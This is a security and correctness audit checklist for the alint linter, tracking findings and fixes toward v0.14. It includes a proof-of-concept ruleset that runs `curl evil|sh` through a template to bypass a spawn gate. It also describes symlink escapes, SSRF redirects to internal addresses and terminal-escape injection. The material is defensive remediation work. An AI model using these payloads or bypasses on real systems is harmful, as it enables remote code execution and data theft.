# Post-v0.13 security + correctness audit — findings & remediation

Status: **In progress (opened 2026-06-27).** Remediation lands phase-by-
phase on CHANGELOG `[Unreleased]` toward v0.14. This doc is the living
checklist: each finding's **Status** flips as it lands.

Scope of the audit: every alint crate (~69k LoC), the DSL/`extends:`
trust boundary, all rule kinds + fixers, all 8 output formats, the CLI +
e2e suite, baseline mode, CI/release infra, bundled rulesets, every
design doc/ADR/spec, the dogfood config, and the full alint.org Astro
site + marketing. Method: 12 scoped adversarial sub-audits run in
parallel, then manual source re-verification of every CRITICAL/HIGH.

## How to read this doc

Status legend per finding:

- `[ ]` — not started
- `[~]` — in progress
- `[x]` — landed (code + test + CHANGELOG)
- `[-]` — deferred or won't-fix, with rationale recorded inline

Each finding carries: **Where** (file:line ground truth), **Problem**,
**Fix** (the chosen remediation), **Test** (the regression guard), and
**Status**. Severity is the audit's calibrated severity, not the
sub-scope-local one.

## Verdict

The engineering is strong: determinism, SRI-mandatory remote extends,
billion-laughs caps, distroless/nonroot images, LF-pinned generated
contracts, and the baseline count-accounting all hold up under
adversarial reading (see §"What's verified solid"). But the central
security guarantee — the spawn gate — has **two confirmed RCE bypasses**,
and path confinement is **lexical-only** so an in-repo symlink escapes
the root and the `allow_out_of_root` gate. Those lead the remediation.

A cross-cutting root cause (§"Themes"): the spawn gate enumerates
spawning kinds at a single *pre-expansion* choke point (`reject_command_
rules_in` over raw `parent.rules`). Every bypass found — templates,
nested configs, and the historical `gff` gap — slips around that choke
point. The keystone fix re-runs the gate on the **finalized,
template-expanded** rule set, tagged by provenance, which closes all
three classes at once.

---

## Phase plan

| Phase | Theme | Findings | Status |
|---|---|---|---|
| 1 | CRITICAL — spawn-gate RCE | C1, C2 | `[x]` |
| 2 | HIGH — security | H1, H2, H5 | `[x]` |
| 3 | HIGH — correctness | H3, H4 | `[x]` |
| 4 | MEDIUM — security cluster | M1–M8 | `[~]` (M1/M6/M7 done; M2–M5,M8 deferred) |
| 5 | MEDIUM — output / CLI / baseline | M9–M14 | `[~]` (M9/M12 done; M10,M11,M13,M14 deferred) |
| 6 | Docs + LOW cleanup + dogfooding (alint) | D1–D12, L1–L14 | `[ ]` |
| 7 | alint.org drift | W1–W7 | `[ ]` |

Phases land security-first. Each is one atomic commit (or a small group)
with a forward `Next: Phase N` pointer, per the phased-rollout
convention. v0.14 cuts when Phases 1–3 are green and 4–7 are fixed or
explicitly deferred.

---

## Phase 1 — CRITICAL: spawn-gate RCE bypasses

### C1 — `extends:`'d ruleset gets RCE via `templates:` `[x]`

**Severity:** Critical. **Where:** `crates/alint-dsl/src/lib.rs:465`
(`reject_command_rules_in` inspects only `rules[].kind`),
`loader.rs:104` (call site, over raw `parent.rules`), `lib.rs:661-679`
(`merge` carries an extended ruleset's `templates` in), `lib.rs:235`
(`finalize` → `expand_template` clones the template body, `kind:
command` included, *after* gating), `lib.rs:731` (`validate` only checks
version + dup ids).

**Problem:** A template-instance rule carries `extends_template:` and no
`kind`, so it passes the gate; `parent.templates` is never gated by
anything. A fully self-contained malicious ruleset achieves arbitrary
code execution through the exact vector the gate exists to stop. SRI
pins the *bytes* but never inspects them, so the advertised *secure*
distribution path gives zero protection. PoC ruleset body:

```yaml
version: 1
templates:
  - id: t
    kind: command
    command: ["sh", "-c", "curl evil|sh"]
    paths: "**/*"
    level: error
rules:
  - id: pwned
    extends_template: t
```

User only needs `extends: ["https://evil.example/r.yml#sha256-<hash>"]`.

**Fix:** See the shared keystone fix below (C1+C2). Specifically, the
post-finalize provenance-aware gate catches the expanded `kind: command`
rule whose provenance is an extended source. Also gate `parent.templates`
kinds directly at load time as defense-in-depth.

**Test:** `crates/alint-dsl` — a remote/bundled ruleset whose body is the
PoC above is rejected with the spawn-gate error; the same template used
from the **top-level** config still works.

### C2 — nested `subdir/.alint.yml` gets RCE `[x]`

**Severity:** Critical (precondition: `nested_configs: true`, opt-in, +
attacker can write a subtree config — untrusted monorepo PR, vendored
dir, submodule). **Where:** `crates/alint-dsl/src/nested.rs:125`
(`load_nested_config`).

**Problem:** `load_nested_config` rejects `extends`, `facts`, `vars`,
`ignore`, `nested_configs`, `baseline` and `allow_out_of_root` — each
called a "trusted, root-only input" — but **never calls
`reject_command_rules_in`**. Discovered nested rules are appended raw
(`lib.rs:121`) and run. The asymmetry is the tell: the *lower*-impact
keys are gated with dedicated tests while the *highest*-impact capability
(RCE) is silently accepted.

**Fix (shared keystone for C1+C2):** Thread rule **provenance**
(top-level vs extended vs nested) through `finalize`, then run
`reject_command_rules_in` + `reject_custom_facts_in` over the
**finalized, template-expanded** rule set, allowing spawning kinds only
from top-level provenance. This closes templates (C1), nested (C2) and
the historical `gff` shape in one place. Belt-and-suspenders: also call
`reject_command_rules_in(&config.rules, …)` directly in
`load_nested_config`, and gate `templates[].kind` in the extends path.

**Test:** nested `command` rule under `nested_configs: true` is rejected
(mirrors `nested_baseline_is_rejected`); a top-level `command` rule with
`nested_configs: true` still runs.

---

## Phase 2 — HIGH: security

### H1 — path confinement is lexical-only; in-repo symlinks escape root `[x]`

**Severity:** High. **Where:** `crates/alint-rules/src/pathsafe.rs:24`
(`normalize_confined`, pure-lexical, doc comment line 2 claims "a rule
can never read or resolve a file outside the tree"); direct-read
consumers that bypass the walker: `pair_hash.rs:127,147`,
`json_schema_passes.rs:107`, `file_exists.rs:135`.
`docs/design/formal-methods.md:20` markets the Kani proof as filesystem
confinement.

**Problem:** Lexical confinement is symlink-blind. If `link` is an
in-repo symlink to `/`, then `link/secret` is all-`Normal` components →
passes → `root.join(...)` → a real symlink-following read outside the
root, never consulting `allow_out_of_root`. `json_schema_passes` echoes
schema-compile errors into the violation message → content-disclosure
oracle on out-of-root files in untrusted-PR CI. Defeats ADR-0004 and the
top-level-only `allow_out_of_root` gate with no race.

**Fix:** After `root.join(confined)`, in the config-derived direct-read
sites, resolve symlinks and re-check containment against the canonical
root (subject to `allow_out_of_root`); on escape, treat as out-of-root
(fail loudly, not a silent read). Keep the lexical pass as the cheap
first gate. Correct the `pathsafe.rs` doc comment and
`formal-methods.md` to scope the Kani proof to the *lexical* policy
(symlinks explicitly out of model) — the proof is real, the prose
overclaims.

**Test:** an in-repo symlink to `/etc` + a `json_schema_passes` /
`pair_hash` / `file_exists` rule referencing through it is reported as
out-of-root (or honored only under `allow_out_of_root`), not silently
read.

### H2 — process crash on crafted multibyte value (structured-query) `[x]`

**Severity:** High. **Where:**
`crates/alint-rules/src/structured_path.rs:512` (`short_render`:
`&raw[..80]`).

**Problem:** `raw = value.to_string()` is the UTF-8 rendering of an
untrusted matched value (serde_json doesn't escape non-ASCII). A value
whose byte 80 is mid-codepoint panics `byte index 80 is not a char
boundary`. Reachable from all 8 `*_path_*` kinds on any failing
comparison; no `catch_unwind` → kills the whole rayon-parallel `alint
check` and the LSP `run_for_file`.

**Fix:** truncate on a char boundary — `raw.chars().take(80).collect()`
with an ellipsis when truncated (and audit any sibling byte-slice on
untrusted strings).

**Test:** a value of 78 ASCII bytes + a 2-byte char that fails its op
renders without panic; add to `structured_path` tests.

### H5 — `when:` expression has no recursion depth guard `[x]`

**Severity:** High. **Where:** `crates/alint-core/src/when/parser.rs:137`
(parse recursion), `when/eval.rs:42-55` (left-recursive eval on
`And`/`Or`).

**Problem:** No depth bound in lex→parse→eval. Deep `(((…)))` overflows
the parser; a *flat* `a and a and …` chain overflows `eval` despite
short-circuiting. Reachable from an untrusted remote `extends:` ruleset
(fetcher caps bytes, not nesting). Stack overflow = uncatchable SIGABRT,
the strongest determinism violation.

**Fix:** a depth counter threaded through `parse_expr`/`eval`, rejecting
past a cap (~256, mirroring `MAX_XML_DEPTH`), with a loud `WhenError`.

**Test:** `when: "(".repeat(50_000)…"` and `"a and ".repeat(50_000)+"a"`
both return a parse/eval error, not a crash.

---

## Phase 3 — HIGH: correctness

### H3 — byte-level fixers corrupt binaries; in-place writes non-atomic `[x]`

**Severity:** High (data loss / corruption of user files). **Where:**
binary-unsafe raw-byte fixers: `fixers/hygiene.rs:237`
(`normalize_line_endings`), `fixers/strip.rs:95` (`strip_bom`),
`fixers/hygiene.rs:116` (`append_final_newline`),
`fixers/creators.rs:182,260` (`file_prepend`/`file_append`); non-atomic
writes: `hygiene.rs:47,213,308`, `strip.rs:102,162`,
`creators.rs:76,182` (all `std::fs::write`, truncate-then-write).

**Problem:** Neither engine dispatch nor `eval_per_file` filters
binaries — only the rule's `paths` glob gates, and `paths: "**"` is
documented. A raw-byte fixer over a `.png` corrupts it. Separately, a
mid-write failure (ENOSPC, SIGINT) leaves the original truncated/lost.

**Fix:** (a) a shared "looks binary" guard (NUL-byte / invalid-UTF-8
heuristic, matching `file_is_text`) that the byte-level fixers consult
and skip on; (b) an atomic-write helper (temp file in the same dir +
`fsync` + rename, preserving mode) used by every content-rewriting
fixer. Reconcile `FileAppendFinalNewlineFixer::apply` with `fix_edit`
(`hygiene.rs:100-131`).

**Test:** a fixer over a crafted binary fixture leaves it byte-identical
(skipped); an atomic-write unit test; idempotence `[fix, fix]` byte-equal
tree.

### H4 — `--config` "later overrides earlier" is false `[x]`

**Severity:** High (silent wrong-config; help text actively misleads).
**Where:** help text `crates/alint/src/main.rs:49`; consumers read
`cli.config.first()` at `main.rs:570,1574,1672`.

**Problem:** First-wins, later `-c` silently dropped, and position-
sensitive across the subcommand boundary. `-c base.yml -c override.yml`
silently uses `base`. No test exercises multi-`-c`.

**Fix (decision — see §Open decisions):** make multiple `-c` a **hard
error** (fail loudly, project value) and correct the help text to "Path
to a config file." — rather than inventing layered-merge semantics that
collide with `extends:`. Revisit last-wins/layering only if a concrete
use case appears.

**Test:** `-c a -c b` exits with a clear "multiple --config" error; a
single `-c` is unaffected.

---

## Phase 4 — MEDIUM: security cluster

### M1 — SSRF via redirects to internal addresses `[x]`
**Where:** `extends/fetcher.rs:33`. ureq defaults `https_only:false`,
`max_redirects:10`; loader validates only the initial URL
(`loader.rs:86`). A pinned-but-malicious https host can 302 →
`http://169.254.169.254/…` / internal IPs. SRI gates the body → blind
SSRF. **Done:** set `max_redirects(0)` on the agent. The loader already
rejects a plain-`http://` initial URL, so refusing *all* redirects closes
the redirect-to-internal vector — and doesn't break the http mock tests
the way `https_only(true)` would. An `extends:` URL is SRI-pinned to
specific content, so it must be the final resource; a redirect now
surfaces as a clear status error.

### M2 — `extends:` target paths are unconfined `[-]`
**Where:** `loader.rs:192` (`resolve_relative`). `extends:
[/etc/hostname]` or `../../x` is read and YAML-parse errors echo content
→ exfil. **Fix:** confine local extends-target resolution to the repo
root (reuse `normalize_confined`), subject to the same top-level-only
trust as `allow_out_of_root`. **Deferred (design call):** confining
`extends:` would break a legitimate monorepo `extends: [../shared/base.yml]`
unless `allow_out_of_root` is honored here too, and the exploit needs an
attacker-controlled local config already inside a trusted chain (narrow).
Wants the confine-vs-`allow_out_of_root` decision; a lighter alternative
is to stop echoing file content in extends parse errors. Tracked for the
focused extends pass.

### M3 — per-file reads bypass the 256 MiB OOM guard `[-]`
**Where:** `structured_path.rs:365,376`, `core/engine.rs:499`,
`core/rule.rs:490` (raw `std::fs::read`). The per-file family
(`file_hash`, `import_gate`, all `*_path_*`) can be OOM'd by one in-tree
multi-GB file; only cross-file kinds call `read_capped`. **Fix:** route
per-file reads through `read_capped` (stat-then-read), emitting the
over-cap violation the guard already defines. **Deferred:** the cap +
`read_capped` live in `alint-rules`, but `engine.rs`/`rule.rs` are in
`alint-core` (which can't depend on `alint-rules`), so the fix needs the
cap hoisted to `alint-core` and a consistent over-cap outcome across all
four read sites (the index already carries `size`, so no extra stat).
Touches the dispatch hot path — wants its own pass. Self-limiting (needs
a committed multi-GB file).

### M4 — `no_symlinks` misses directory + escaping symlinks `[-]`
**Where:** `no_symlinks.rs:29` (iterates `index.files()`, which excludes
dir entries; the walker prunes escaping symlinks pre-index). **Fix:**
detect symlinks via `symlink_metadata` during the walk and surface them
to `no_symlinks` (a dedicated symlink list on the index, or have the rule
re-stat candidate paths), so dir symlinks and root-escaping symlinks are
flagged. **Deferred:** needs a walker/`FileIndex` change — a per-entry
`is_symlink` flag plus recording dir-symlinks and the root-escaping
symlinks the walker currently prunes. Core + determinism-sensitive;
wants its own pass.

### M5 — `git_no_denied_paths` denylist is root-anchored `[-]`
**Where:** `git_no_denied_paths.rs:99`. For a *secrets* control,
`*.pem`/`id_rsa` match only repo root, so `secrets/server.pem` evades.
**Fix:** auto-anchor bare/`*` denied patterns to `**/` (or emit a
loud build-time warning when a denied pattern lacks `**/`), documented as
a security-control default distinct from the general glob footgun.
**Deferred (semantics call):** auto-anchoring silently changes glob
matching for everyone (a user who wrote `*.env` expecting root-only would
suddenly match any depth). Wants a decision on auto-anchor vs
warn-at-build vs doc-only before landing. Tracked.

### M6 — non-UTF-8 git data silently collapses checks `[~]`
**Where:** `core/git.rs:60,135` (one non-UTF-8 path → whole tracked/
changed set bails to `None`), `git.rs:431` (non-UTF-8 commit field drops
the commit from range checks → commit-message-lint bypass). **Fix:**
keep paths as `OsStr`/bytes and drop only the offending entry; for commit
fields, `from_utf8_lossy` (fail-closed/visible) rather than silently
skip the whole commit. **Done:** the commit-lint **bypass** (`git.rs:431`)
— the security-relevant half — now lossily decodes each commit field, so
a non-UTF-8 author/message can no longer dodge linting (regression test
updated). **Deferred:** the tracked/changed-path collapse (`git.rs:60,135`)
is a `HashSet<String>` → would need an `OsStr`/bytes refactor of the path
sets; lower impact (makes `git_tracked_only` over-permissive, not a
bypass). Tracked.

### M7 — `SystemTime` overflow panic on crafted commit timestamp `[x]`
**Where:** `core/git.rs:582` (`UNIX_EPOCH + Duration::from_secs(secs)`).
A 19-digit author-time panics. Reachable via `git_blame_age` on an
untrusted repo. **Done:** `UNIX_EPOCH.checked_add(...)`; on overflow the
block is dropped (matching the adjacent posture), no panic.

### M8 — terminal-escape injection in the human formatter `[-]`
**Severity:** Medium (needs a TTY / `--color=always`; CI formats are
already safe). **Where:** `output/human.rs:85,162,331,360,446`
(unsanitized paths/messages). A repo file named with `\x1b[…]` can hide
findings or forge an "all passed" banner when a human lints an untrusted
repo. **Fix:** a control-char/ANSI sanitizer applied to all attacker-
controlled spans (paths, messages, snippets) on the human/compact/fix
paths; preserve intentional styling emitted by alint itself. **Deferred:**
needs a shared sanitizer across three render paths with care not to strip
alint's own styling; conditional on a TTY / `--color=always` (every CI
format is already neutralized). Wants its own focused pass. Tracked.

---

## Phase 5 — MEDIUM: output / CLI / baseline

### M9 — SARIF `artifactLocation.uri` is a raw OS path `[x]`
**Where:** `output/sarif.rs:122`. Not percent-encoded/forward-slashed →
non-conformant for spaces/`#`/`%`; `\`-separated on Windows breaks
GitHub Code-Scanning file mapping. **Done:** a `path_to_uri` helper
slashes `\`→`/` and percent-encodes space/`#`/`%`/controls/non-ASCII per
RFC 3986; plain-ASCII paths are unchanged (existing snapshots stable);
unit-tested.

### M10 — GitLab fingerprint omits line; ADR-0006 overclaims unification `[-]`
**Deferred:** the code half (add `line` to the gitlab fingerprint) is
small, but it pairs with the ADR-0006 / `baseline.md` reconciliation and
the deferred gitlab fingerprint-unification work (baseline.md §5/§7); do
together so the fingerprint isn't changed twice. Tracked.
**Where:** `output/gitlab.rs:115` (`SHA256(rule_id|path|message)`,
excludes line). Distinct findings with identical messages collapse →
count disagrees with json/junit/sarif. `docs/adr/0006:74` claims this
fingerprint was unified onto `violation_fingerprint`; it wasn't. **Fix:**
include line (and/or a per-occurrence discriminator) in the gitlab
fingerprint; reconcile ADR-0006 §Decision with `baseline.md` (the
unification is deferred, not done — say so).

### M11 — exit codes: documented `3` never produced; `2` overloaded `[-]`
**Deferred (doc-coordination):** the README half overlaps the parallel
doc-drift pass; §Open decisions leans "document the real 2-code contract"
(a 2/3 split is a public-contract change, low value). Do after the doc
branch merges.
**Where:** README:212 documents `3` (internal); `main.rs:380` funnels
every `anyhow` error to exit `2`. **Fix:** either implement distinct
exit codes (`2` config, `3` internal) or correct the README + the
in-code `validate-config` doc-comment (`main.rs:1543`) to the actual
contract. Decision recorded in §Open decisions.

### M12 — `--baseline` family silently ignored on non-`check` subcommands `[x]`
**Where:** only `cmd_check` reads `cli.baseline` (`main.rs:787`); `fix`/
`list`/`baseline`/… accept the flag and ignore it, violating its
"missing baseline is an error" contract. **Done:** `--baseline` /
`--strict-baseline` / `--show-baselined` are rejected on every subcommand
except `check` (the `baseline` subcommand writes via its own `--output`,
not this flag), mirroring the `--only` rejection; trycmd-tested.

### M13 — global `--format` bypasses per-subcommand value gate by position `[-]`
**Deferred:** validate `--format` against each subcommand's allowed set in
the handler (fail loudly regardless of position) — clean but multi-site;
next CLI pass.
**Where:** global `--format` is an unrestricted `String` (`main.rs:54`);
`alint --format sarif validate-config` → exit 0, silently ignored.
**Fix:** validate `--format` against the subcommand's allowed set in the
handler (fail loudly on an unsupported value regardless of position).

### M14 — baseline first-offender masking under-disclosed `[-]`
**Deferred (doc + decision):** the disclosure note lands in
`docs/design/baseline.md` §4, which the parallel doc-drift pass touches —
do after merge. The keying question (switch `line_max_width` /
`file_content_forbidden` to a path key, or keep + document the fail-closed
churn) is the open decision below.
**Where:** first-offender/first-match kinds (`no_trailing_whitespace`,
`line_endings`, `line_max_width`, `file_content_forbidden`) emit only the
first offender per file, so a *new* same-file offense is never emitted
once baselined. `docs/design/baseline.md:266` calls the masking window
"narrowest possible"; §4 doesn't list this for the content-keyed pair.
**Fix:** document the file-level acceptance window honestly in
`baseline.md` §4; assess whether `line_max_width`/`file_content_forbidden`
should switch to a path key for consistency with the other two (or accept
the churn). Likely a doc + small keying change, not a deep redesign.

---

## Phase 6 — Docs, LOW cleanup, dogfooding (alint repo)

Doc drift (D):

- `[ ]` **D1** README:222 "Twenty-two rulesets" enumerates only 19 —
  missing `apache/governance`, `agent-hygiene`, `agent-context`. README:44
  bullet enumerates 21. Add the three; reconcile both lists to 22.
- `[ ]` **D2** `CONTRIBUTING.md:55` MSRV "Rust 1.95+" vs `Cargo.toml`
  `rust-version = "1.85"`. Fix to 1.85.
- `[ ]` **D3** `SECURITY.md:43` published-crate list wrong both ways
  (lists `alint-testkit` `publish=false`; omits `alint-lsp`). Sync to
  `ci/scripts/publish-crates.sh`.
- `[ ]` **D4** `GOVERNANCE.md:9` stale "Version: v0.9.x" + bogus
  four-component versioning. Update to current + semver.
- `[ ]` **D5** `docs/benchmarks/README.md:8` "Latest published v0.9.6";
  METHODOLOGY/RUNNING claim a per-push `bench-compare` gate no workflow
  runs; "8 scenarios" is 14. Refresh.
- `[ ]` **D6** `docs/design/deterministic-perf-gating.md:65-85`
  §Automation overstates the gate (contradicts its own §Findings:
  advisory `::warning exit 0`, self-hosted, no committed-baseline dir).
- `[ ]` **D7** `docs/design/baseline.md:11` stale "Draft… post-v0.14"
  footer vs "Status: Implemented." Remove the draft footer.
- `[ ]` **D8** README:39,44 "ecosystem-gated → silent no-op"
  overgeneralizes (5 rulesets are ungated; README:242 says so). Qualify.
- `[ ]` **D9** `docs/rules.md:858` Action pin `@v0.9.21`; README:146
  docker `:0.10`; README:274 format list omits `agent`; README:46 lists
  3 of 6 fact predicates. Bump/complete.
- `[ ]` **D10** ARCHITECTURE.md / architecture-diagrams.md /
  architecture-as-code.md describe the pre-LikeC4 Mermaid crate-graph and
  "pending merge/deploy" / "runner rebuild" state that already shipped
  (#69-71, #90). Refresh + add superseded pointers.
- `[ ]` **D11** CHANGELOG: missing v0.4.3–v0.4.8 entries; em-dash vs
  hyphen header separator drift. Backfill/normalize (or note the gap).
- `[ ]` **D12** `CONTRIBUTING.md:72` `docs.sh` gate list under-counts;
  `:189` "release.yml-equivalent CI" misnomer (PR gate is ci.yml).

LOW correctness cleanup (L):

- `[ ]` **L1** `no_bidi_controls.rs:31` add U+200E/200F/061C (complete
  the Trojan-Source set); `no_zero_width_chars.rs:25` add U+2060/U+180E;
  decide ZWJ-in-grapheme handling for the strip fixer.
- `[ ]` **L2** `no_case_conflicts.rs:38`, `case.rs:69`,
  `filename_case.rs:48` — ASCII-only case-folding misses real macOS/NTFS
  Unicode collisions; `file_ops.rs:112` rename guard false-positives
  case-only renames on case-insensitive FS. Use Unicode-aware folding;
  special-case same-inode case-only renames.
- `[ ]` **L3** `when/lexer.rs:136` `byte as char` lexes string literals
  as Latin-1 → non-ASCII `when:` comparisons silently never match. Decode
  UTF-8 properly.
- `[ ]` **L4** `file_header`/`file_footer` append/prepend fixers don't
  verify the regex is satisfied → can stack duplicates across `--fix`
  runs (`file_starts_with` refuses a fixer for exactly this reason).
  Make them verify-then-skip or refuse like the siblings.
- `[ ]` **L5** extends cache fixed `<sri>.yml.tmp` temp name races
  concurrent runs (`extends/cache.rs:83`); unbounded acyclic local-extends
  recursion (`loader.rs:48`). PID/rand-suffix the temp; add a depth cap.
- `[ ]` **L6** `custom` fact has no timeout despite the doc claiming one
  (`facts.rs:134`); implement a timeout or fix the doc.
- `[ ]` **L7** non-`NotFound` `fs::read` errors silently swallowed
  (`engine.rs:499`, `rule.rs:490`, `facts.rs:254`) — distinguish
  `NotFound` (skip) from real I/O errors (surface).
- `[ ]` **L8** `template.rs:71` `render_path` re-substitutes injected
  `{ext}`/`{dir}` tokens from repo-named paths → wrong path for forbidding
  rules. Single left-to-right scan into a fresh buffer.
- `[ ]` **L9** `did_you_mean.rs:105` levenshtein matrix unbounded on a
  huge unknown-field name; cap input length.
- `[ ]` **L10** `eval.rs:61` `null matches …` hard-errors while `null ==`
  is falsy — make `matches` on a missing fact falsy (or document).
- `[ ]` **L11** `jsonpath_diagnostics.rs:34` dashed-key hint fires inside
  string literals (cosmetic); skip quoted spans.
- `[ ]` **L12** `spawn.rs:89,96` unbounded `read_to_end` on child output
  — cap with a loud over-cap note (trust-gated, so low risk).
- `[ ]` **L13** `command.rs:112,153` no `--`/`./` guard before path
  tokens → leading-dash filenames become options. Insert `--` or `./`.
- `[ ]` **L14** `scope.rs:45` empty `paths: []` is fail-open (match-all);
  document, and consider warning.

Dogfooding (Dog):

- `[ ]` **Dog1** `.alint.yml` exercises 27/89 kinds with zero cross-file,
  structured-query, or git-hygiene rules (the flagship families) and
  doesn't extend `monorepo/cargo-workspace` despite being a 9-crate
  workspace. Add a representative dogfood slice of each flagship family
  (it doubles as living proof + regression coverage on real content).
- `[ ]` **Dog2** two files exceed `rust-file-max-lines` (downgraded to
  `warning`, so the self-lint isn't green): `crates/alint-dsl/src/lib.rs`
  (~2059) and `xtask/src/docs_export.rs` (~2131). Split them, or
  re-baseline the threshold with a recorded justification (the config
  comment already invited exactly this).

---

## Phase 7 — alint.org drift (site repo)

Tracked here for a single source of truth; lands in the alint.org repo.

- `[ ]` **W1** `src/pages/compare.astro:204` bundled-ruleset count "21" →
  22 (facts.json). Also widen the count gate so it catches noun-before-
  digit table headers (`extract_counts_near_noun` is case-sensitive,
  digit-then-noun only).
- `[ ]` **W2** `src/content/blog/introducing-alint.md:116` "The current
  release is v0.11" → v0.13.0; teach the bumper/gate the "current
  release" phrasing (currently only "latest release" is anchored).
- `[ ]` **W3** `src/pages/api/rulesets.json.ts:29` regex omits `apache`
  → `apache/governance` emits a non-resolvable URI + 404 source link. Add
  `apache` to `NESTED_PREFIX_RE`.
- `[ ]` **W4** `src/pages/api/rules.json.ts:148` `sourceUrlOf` 404s for
  19/89 kinds (aliases + shared-file structured-query kinds). Map aliases
  and shared files to their real source path.
- `[ ]` **W5** `.gitignore` omits the synced `src/content/docs/docs/
  reference/` dir (untracked after every sync; a stray `git add -A` would
  commit regeneratable files). Add it next to the other synced subtrees.
- `[ ]` **W6** Drift-gate blind spots: no coverage for families /
  case-study / examples counts; "current release" phrasing; API
  endpoints; and `deploy.yml` doesn't run the gates (merge-only). Add
  guards or document the residual risk in marketing/STATE.md.
- `[ ]` **W7** Case studies are point-in-time (alint v0.9.17, "future
  tense" for now-shipped kinds). Add a visible "as of vX" banner or a
  revalidation note so they don't read as current-catalogue claims.

---

## Themes / root causes

1. **Spawn gate enumerates at one pre-expansion choke point.** Three
   bypasses to date (`gff`, templates, nested). Keystone fix: gate the
   *finalized* rule set by provenance. Prefer a capability check that
   can't be routed around (post-expansion) over an ever-growing
   enumerate-and-reject list.
2. **Lexical-only confinement + symlink-following reads.** `pathsafe` is
   lexical by design but several callers do real reads through the
   joined path, and the walker's index-pruning doesn't cover the
   direct-read rules. Confinement claims must be scoped to what the FS
   layer actually enforces.
3. **"Fail loudly" has systematic silent-swallow gaps.** Non-UTF-8 git
   collapse, `fs::read` error swallowing, `--baseline` ignored off
   `check`, `--config` dropped, `--format` positional bypass. A pass to
   make each of these surface an error.
4. **Untrusted-input encoding.** Latin-1 `when:` literals, ASCII-only
   case folding, byte-slice panic, incomplete unicode-control sets — a
   recurring "we treated bytes as ASCII" class.
5. **Drift gates have blind spots.** Both repos' generated-contract gates
   are good but miss specific phrasings/layouts (capitalized nouns,
   "current release", families count, API endpoints). Widen the matchers
   and add the missing count anchors.

---

## What's verified solid (do not re-investigate)

SRI mandatory for remote extends; `http://` + nested-remote-extends
rejected; billion-laughs/alias-bombs capped by serde_yaml_ng; no `sh -c`
anywhere; XXE/`$ref`-SSRF closed (`allow_dtd:false`, no http retriever);
baseline `schema_version` gating, count-summing, regeneration guard and
SARIF mark-not-remove all sound; the per-kind `baseline_key`
disambiguation + collision-invariant test hold; bundled-ruleset chain (22
files ↔ facts.json ↔ 22 doc pages ↔ e2e) fully consistent and
CI-enforced; every `gen-X --check` artifact gated *and* LF-pinned;
Dockerfile distroless/nonroot; all six facts.json counts match code;
walker symlink index-pruning + determinism correct; github/junit output
escaping correct; the Kani confinement proof is a real proof (of the
lexical policy). The roxmltree 0.20 pin is load-bearing — do not bump.

---

## Open decisions

1. **H4 `--config`:** fail-loud on multiple `-c` (chosen) vs implement
   last-wins/layered merge. Chosen the conservative fail-loud; flag for
   asamarts if layered configs are wanted.
2. **M11 exit codes:** implement a distinct `3` (internal) vs document
   the real 2-code contract. Leaning *document* (a 2/3 split is a public
   contract change; low value). Confirm.
3. **M14 baseline keying:** doc-only disclosure vs also switch
   `line_max_width`/`file_content_forbidden` to a path key. Leaning
   doc + keep keys (the churn is fail-closed). Confirm.
